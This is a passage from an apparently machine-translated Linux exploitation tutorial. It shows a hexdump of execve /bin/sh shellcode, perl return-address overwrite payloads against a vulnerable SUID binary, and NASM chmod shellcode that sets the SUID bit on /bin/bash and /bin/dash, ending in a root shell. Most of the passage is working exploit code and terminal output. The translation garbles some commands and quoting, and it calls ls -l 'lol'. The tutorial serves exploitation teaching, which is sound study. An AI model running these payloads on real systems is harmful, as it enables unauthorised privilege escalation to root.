00000000: 31c0 b0d5 31db cd80 31c0 5068 2f2f 7368 1…1…1.Ph//sh  
00000010: 682f 6269 6e89 e350 5389 e1b0 0b31 d2cd h/bin..PS….1..  
00000020: 800a

$ gcc getenv.c -o getenv -m32

$ /home/arget/getenv sc /home/arget/a  
sc will be at 0xffffdc5d

Then we jump to 0xffffdc5d. A good reader will be appreciated that the program [getenv](https://gist.github.com/superkojiman/6a6e44db390d6dfc329a) does not provide the arguments to calculate the address of the variable, this is because in the stack arguments are just below the environmental variables, so not affect them.  
``# Sol 3  
$ /home/arget/a `perl -e 'print "A"x1036 . "x5dxdcxffxff"'`  
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA]���  
sh-4.4# whoami  
sh-4.4#``

And the fourth and final solution. We can simply change the permissions on  /bin/sh so that it becomes a SUID binary. This requires a need to run chmod ( “/bin sh”, 04775) (in C, a number preceded by a 0 indicates it is in octal, or actually must enter the number 2541 or 0x9ed). Nothing easier

    $ cat a.asm
    BITS 32
    xor    eax, eax
    xor    ecx, ecx
    push   eax
    push   0x68732f2f
    push   0x6e69622f
    mov    ebx, esp
    mov    cx, 0x9ed
    mov    al, 15        ; __NR_chmod
    int    0x80

Okay, and we assemble.

    $ nasm a.asm -o a.o

$ lol a.o  
\-rw-r–r– 1 arget arget 25 jul 5 12:50 a.o

$ /home/arget/a \`cat a.o“perl -e ‘print “A”x(1036-25) . “x10xcbxffxff”‘\`  
1�1�Ph//shh/bin��f��

What?? We are not alarmed, the shellcode has no null bytes, nor should it be anything serious. Ltrace by a check that puts() prints only 21 bytes, so the problem will be right there. Looking shellcode found a 0x09 byte corresponding to the tabulation surely what happens is that also serves to separate arguments (like space). It has very simple solution, the payload will place it between quotation marks.

```$ /home/arget/a "`cat a.o``perl -e 'print "A"x(1036-25) . "x10xcbxffxff"'`"  
1�1�Ph//shh/bin��f�� �̀AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA ���  
segmentation fault```  
Okay, I know it seems that nothing has happened, but actually has spent all.

    $ lol /bin/bash
    -rwsr-xr-x 1 root root 866600 jun  4 10:54 /bin/bash

(Permits /bin bash are changed because /bin/sh is a symbolic link to it) However, it is true that when trying to run it for some internal matter of bash, we do not root. In any case we have shown to change permissions to a file belonging to root. We could also change the permissions of /etc/ shadow. Another possible target is the dash interpreter that, unlike bash, does allow root access when you have the SUID bit enabled.

    # Sol 4
    $ lol /bin/dash
    -rwxr-xr-x 1 root root 110000 oct 23  2016 /bin/dash

$ dash  
$ whoami  
arget  
$ exit

$ cat a.asm  
BITS 32  
xor eax, eax  
xor ecx, ecx  
mov al, ‘h’  
push eax ; “hx00x00x00”  
push 0x7361642f ; “/das”  
push 0x6e69622f ; “/bin”  
mov ebx, esp  
mov cx, 0x9ed  
mov al, 15 ; \_\_NR\_chmod  
int 0x80

$ nasm a.asm -o a.o

$ lol a.o  
\-rw-r–r– 1 arget arget 27 jul 5 13:09 a.o

$ /home/arget/a “\`cat a.o“perl -e ‘print “A”x(1036-27) . “x10xcbxffxff”‘\`”  
1�1ɰhPh/dash/bin��f�� �̀AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA ���  
Segmentation fault

$ lol /bin/dash
-rwsr-xr-x 1 root root 110000 oct 23  2016 /bin/dash

$ dash  
\# whoami  
root  
#

There it is. What happens is that dash is not standard, not always in the last system. For would not hurt to add at the end of the shellcode an exit(0) to avoid breaking the program after the chmod().

Do not forget to re-enable ASLR and remove the SUID bit files /bin/bash and /bin/dash. You not want to keep the program we have been operating as SUID, because if someone enters your system, you can use it exactly the same way that we have used.